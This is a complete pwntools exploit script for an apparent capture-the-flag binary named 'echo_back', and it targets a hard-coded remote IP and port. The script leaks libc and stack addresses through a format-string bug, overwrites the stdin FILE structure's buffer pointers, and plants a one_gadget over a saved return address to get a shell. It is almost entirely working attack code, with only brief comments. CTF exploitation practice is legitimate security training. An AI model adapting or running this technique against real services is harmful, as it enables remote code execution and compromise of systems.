from pwn import *
context(os="linux", arch="amd64")

DEBUG = 1
LOCAL = 0

if (DEBUG):
	context.log_level = "debug"

g_fname = "./echo_back"
g_elf = ELF(g_fname)
g_libcname = "./libc-2.23.so"
g_libc = ELF(g_libcname)

if (LOCAL):
	g_io = process(g_fname)
	g_libc = g_elf.libc
else:
	g_io = remote("220.249.52.134", 52877)
	g_libc = ELF(g_libcname)

s, sa, sl, sla = g_io.send, g_io.sendafter, g_io.sendline, g_io.sendlineafter
r, ru, rl = g_io.recv, g_io.recvuntil, g_io.recvline

def getpid():
	if (DEBUG & LOCAL):
		log.info("pid: %d", g_io.proc.pid)
		pause()

def opt(idx):
	sla("choice>> ", str(idx))

def echo_back(content):
	opt(2)
	sla("length:", "7")
	s(content)

def set_name(name):
	opt(1)
	sa("name:", name)

def leak_data(payload):
	echo_back(payload)
	ru("anonymous say:")
	data = rl()[:-1]
	return int(data, 16)

def pwn():
	# 1st. leak __libc_start_main+240 and __libc_argv	
	off1 = 19 # offset of __libc_start_main+240
	off2 = 21 # offset of __libc_argv
	off_start_main = 240 + g_libc.symbols["__libc_start_main"] # libc-2.23
	off_one_gadget = 0xf1207 if LOCAL else 0xf1147

	fmt_tmp = "%{off}$p\n"
	libc_start_main = leak_data(fmt_tmp.format(off=off1))
	libc_argv = leak_data(fmt_tmp.format(off=off2)) 
	log.success("__libc_start_main+240=%#x\nlibc_argv=%#x", libc_start_main, libc_argv)

	libc_base = libc_start_main - off_start_main
	stack_addr = libc_argv - 0xe0 # stack address of __libc_start_main+240
	g_libc.address = libc_base
	one_gadget = libc_base + off_one_gadget # for libc-2.23.so
	addr_IO_stdin = g_libc.symbols["_IO_2_1_stdin_"] # for libc-2.23.so
	addr_IO_buf_base = addr_IO_stdin + 0x38
	org_IO_buf_base = addr_IO_stdin + 0x83
	log.success("libc@%#x\n__libc_start_main+240@%#x [on stack]\none_gadget@%#x\n_IO_stdin=%#x\n_IO_buf_base@%#x", libc_base, stack_addr, one_gadget, addr_IO_stdin, addr_IO_buf_base)
	
	# 2nd. set &_IO_stdin->_IO_buf_base as name, and use fmt with "%{off}$hhn" to make it
	# points to _IO_stdin->_IO_write_base
	off3 = 16 # offset ot user name content
	set_name(p64(addr_IO_buf_base)[:-2])
	#getpid()
	echo_back("%{off}$hhn".format(off=off3))

	# 3rd. make _IO_buf_base = stack_addr -> __libc_start_main+240
	payload = flat([
		p64(org_IO_buf_base) * 3, # reamin original value
		p64(stack_addr), p64(stack_addr + 8)
	])

	opt(2)		
	sa("length:", payload)	

	# must use pause() to make "hi" be read by read() instead of previous scanf().
	pause()
	sl()

	# padding 0x27 time to make _IO_read_ptr == _IO_read_end
	for i in range(1, 0x28):
		opt(2)
		sa("length:", '\n')
	
	# 4th. write one_gadget to where __libc_start_main+240 locates.
	opt(2)
	sa("length:", p64(one_gadget))

	pause()
	s("\n")
	#getpid()	
	opt(3)

if ("__main__" == __name__):
	pwn()
	g_io.interactive()
